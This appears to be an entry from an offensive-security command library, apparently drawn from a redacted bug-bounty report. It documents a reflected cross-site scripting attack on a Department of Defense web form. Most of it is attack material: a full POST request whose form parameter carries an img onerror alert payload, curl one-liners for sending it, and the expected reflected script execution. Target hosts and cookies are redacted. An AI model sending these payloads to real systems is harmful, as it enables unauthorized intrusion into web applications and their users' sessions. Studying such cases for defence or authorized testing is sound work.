---
data: >-
  POST /██████_█████████=1&█████████=test HTTP/1.1

  Host: ███

  Cookie: █████

  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
  Firefox/91.0

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate

  Content-Type: application/x-www-form-urlencoded

  Content-Length: 101

  Origin: https://███████

  Authorization: Basic ....

  Referer: https://███████

  Upgrade-Insecure-Requests: 1

  Sec-Fetch-Dest: document

  Sec-Fetch-Mode: navigate

  Sec-Fetch-Site: same-origin

  Sec-Fetch-User: ?1

  Te: trailers

  Connection: close

  21__Click=0&activeFlag=Y&%25%25Surrogate_██████=1&██████████=<img src%3dx
  onerror%3dalert(document.domain)>
tags:
  - xss
  - post-request
type: command
output: |-
  HTTP/1.1 200 OK
  ... (response with reflected payload executing JS)
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:19.858Z'
id: d2f471ed-c2d9-4248-a0ba-f0702e0db86a
verified: false
validated: true
submitted: true
---
# modified-post-request-xss

## Command

```http
POST /██████_█████████=1&█████████=test HTTP/1.1
Host: ███
Cookie: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: https://███████
Authorization: Basic ....
Referer: https://███████
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
21__Click=0&activeFlag=Y&%25%25Surrogate_██████=1&██████████=<img src%3dx onerror%3dalert(document.domain)>
```

## Description

This HTTP POST request simulates the tampered form submission to the DoD application's forum endpoint, injecting an XSS payload into the redacted parameter to trigger reflection and JS execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Target domain (████) | Yes |
| Cookie | Session cookies (█████) | Yes |
| ██████████ | Vulnerable parameter with payload | Yes |
| Content-Length | Length of body (adjust as needed) | Yes |

## Examples

### Basic Usage

Send via Burp or curl equivalent:

```bash
curl -X POST -H "Host: ███" -H "Cookie: █████" -d "21__Click=0&activeFlag=Y&%25%25Surrogate_██████=1&██████████=<img src%3dx onerror%3dalert(document.domain)>" https://██████/██████_█████████
```

### Advanced Usage

With full headers for authenticity:

```bash
curl -X POST -H "User-Agent: Mozilla/5.0 ..." -H "Authorization: Basic ...." -d "..." https://██████/██████_█████████
```

## Expected Output

Server responds with 200 OK and HTML reflecting the payload, triggering an alert with document.domain (e.g., "██████.mil").

## Related

- [[commands/inject-xss-payload-img-onerror]]
- [[procedures/Inject-XSS-Payload-into-Parameter]]
